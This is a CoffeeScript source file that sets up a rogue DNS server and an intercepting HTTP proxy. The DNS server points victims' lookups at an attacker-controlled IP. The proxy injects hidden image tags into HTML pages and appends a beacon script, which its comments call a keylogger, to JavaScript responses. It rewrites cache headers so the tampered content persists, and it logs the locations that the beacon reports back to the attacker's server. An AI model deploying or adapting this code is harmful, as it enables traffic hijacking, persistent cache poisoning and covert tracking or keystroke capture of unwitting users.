
url = require 'url'
target_urls = require './target_urls'
dns = require 'native-dns'
httpProxy = require 'http-proxy'
fs = require 'fs'
querystring = require 'querystring'

intercept_domains = []

UPSTREAM_DNS = process.env.UPSTREAM_DNS or '8.8.8.8'
PUBLIC_IP = process.env.PUBLIC_IP or '54.242.214.102'
DNS_TTL = 60
DNS_TIMEOUT = 1000
DNS_PORT = 53
HTTP_PORT = 80
CACHE_EXPIRE = 'Tue, 31 Oct 2017 20:00:00 GMT'

beacon = fs.readFileSync('beacon.js').toString().replace('{{IP}}', PUBLIC_IP)

cache_poisoned = false

for target_url in target_urls
  {hostname, path} = url.parse(target_url)
  if hostname not in intercept_domains
    intercept_domains.push hostname

server = httpProxy.createServer (req, res, proxy) ->
  if req.headers['host'] == PUBLIC_IP
    {query} = url.parse(req.url)
    {location} = querystring.parse(query)
    if location
      console.log "Tracked location: #{location}"
    res.end()
    return

  full_url = "http://#{req.headers['host']}#{req.url}"

  req.headers['accept-encoding'] = 'plain'
  delete req.headers['if-modified-since']
  delete req.headers['if-none-match']

  res.oldWriteHead = res.writeHead
  res.writeHead = (code, headers) ->
    if code == 200
      if /text\/html/.exec(headers['content-type'])
        console.log "Injecting page #{full_url}"
        fake_imgs = ''
        for target_url in target_urls
          fake_imgs += "<img src=\"#{target_url}\" style=\"display: none\" />"
        inject = (data) -> data.replace('</body>', "#{fake_imgs}</body>")
        cache_poisoned = true
      else if /(application|text)\/(x-)?javascript/.exec(headers['content-type'])
        console.log "Injecting script #{full_url}"
        inject = (data) -> data + beacon
      
      if inject?
        # Drop the Content-Length header since we'll be changing the
        # content
        delete headers['content-length']
        delete headers['cache-control']
        delete headers['max-age']
        headers['expires'] = CACHE_EXPIRE

        # buffer the response until it is complete, so we can inject
        # it with the keylogger
        data = ''
        res.oldWrite = res.write
        res.write = (chunk) ->
          data += chunk

        res.oldEnd = res.end
        res.end = ->
          # We want to inject the keylogger into the <head> element
          # without clashing with <meta http-equiv> tags, so we insert
          # it after the title closing tag.
          data = inject data
          res.oldWrite data
          res.oldEnd()

    res.oldWriteHead code, headers

  if req.headers['host']?
    proxy.proxyRequest req, res,
      host: req.headers['host']
      port: HTTP_PORT
  else
    # ignore requests that don't have a Host header
    res.end()

server.listen HTTP_PORT, ->
  console.log "HTTP Proxy listening on port #{HTTP_PORT}"

dnsServer = dns.createServer()

dnsServer.on 'request', (req, res) ->
  if (req.question[0].name in intercept_domains) or not cache_poisoned
    # console.log "Intercepting DNS request for #{req.question[0].name}"
    res.answer.push dns.A
      name: req.question[0].name
      address: PUBLIC_IP
      ttl: DNS_TTL
    res.send()
  else
    # For all other names, proxy the request to an upstream DNS
    # server supplied in UPSTREAM_DNS. Forward the response
    # unmodified
    newReq = dns.Request
      server:
        address: UPSTREAM_DNS
        port: DNS_PORT
      question: dns.Question(req.question[0])
      timeout: DNS_TIMEOUT
    newReq.on 'message', (err, answer) ->
      res.answer = res.answer.concat(answer.answer)
    newReq.on 'end', ->
      res.send()
    newReq.send()

dnsServer.serve DNS_PORT

